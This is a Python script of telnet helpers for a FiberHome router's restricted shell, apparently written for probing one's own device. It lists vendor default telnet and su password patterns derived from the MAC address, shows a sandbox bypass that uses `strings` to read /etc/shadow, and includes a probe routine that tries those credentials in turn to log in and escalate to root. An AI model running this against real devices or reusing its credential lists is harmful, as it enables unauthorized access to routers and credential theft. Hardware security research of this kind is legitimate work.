#!/usr/bin/env python3
"""Telnet (port 23) helpers for the fhshell sandbox.

The stock telnet login is: admin / hg2x0+MAC6 (MAC6 = bridge MAC last 6 hex,
see device_local.py). The shell is a whitelist sandbox: cat/grep/ps are blocked
("Operation not permitted") but ls / strings / md5sum / which are allowed --
`strings` is a universal read primitive.

Usage:
  python telnet_read.py "strings /etc/shadow" ["cmd2" ...]
  python telnet_read.py --probe     try known FiberHome credential patterns
"""
import socket
import sys
import time
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import device_local as D

HOST = getattr(D, "HOST", "192.168.8.1")
USER, PW = "admin", "hg2x0" + D.MAC6


class Tel:
    def __init__(self, host=HOST, port=23, user=USER, pw=PW):
        self.s = socket.create_connection((host, port), timeout=6)
        self.recv(2.0)
        self.send(user)
        self.recv(0.6)
        self.send(pw)
        self.recv(1.2)

    def recv(self, w=1.5):
        self.s.settimeout(w)
        d = b""
        try:
            while True:
                c = self.s.recv(65536)
                if not c:
                    break
                d += c
        except socket.timeout:
            pass
        return d.decode("utf-8", "replace")

    def send(self, text):
        self.s.sendall((text + "\n").encode())

    def run(self, cmd, w=2.0):
        self.send(cmd)
        time.sleep(0.3)
        out = self.recv(w).replace("\r", "")
        lines = out.splitlines()
        if lines and lines[0].strip() == cmd:
            lines = lines[1:]
        while lines and lines[-1].strip().endswith(":/$"):
            lines = lines[:-1]
        return "\n".join(lines).strip()

    def close(self):
        try:
            self.send("exit")
            time.sleep(0.2)
            self.s.close()
        except Exception:
            pass


def probe():
    """Try the known FiberHome telnet/su credential patterns (historical matrix)."""
    m = D.MAC6
    tel_cands = [("admin", "hg2x0" + m), ("admin", "Fh@" + m), ("admin", "F1ber$dm")]
    su_cands = ["f1ber@dm!n" + m, "F1ber@dm!n", "F1ber$dm", "Fh@" + m]
    for u, p in tel_cands:
        try:
            t = Tel(user=u, pw=p)
            print(f"telnet {u}/{p[:5]}***: OK")
            for su in su_cands:
                t.send("su -")
                time.sleep(0.6)
                r = t.recv(1.0)
                if "assword" in r:
                    t.send(su)
                    time.sleep(0.8)
                    r2 = t.recv(1.2).replace("\r", "")
                    print(f"  su {su[:6]}***: {'OK?!' if 'incorrect' not in r2 else 'fail'}")
            t.close()
            break
        except Exception as e:
            print(f"telnet {u}/{p[:5]}***: fail ({e})")
        time.sleep(1.5)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--probe":
        probe()
    else:
        t = Tel()
        try:
            for cmd in sys.argv[1:]:
                print(f"$ {cmd}")
                print(t.run(cmd, w=2.5))
                print()
        finally:
            t.close()
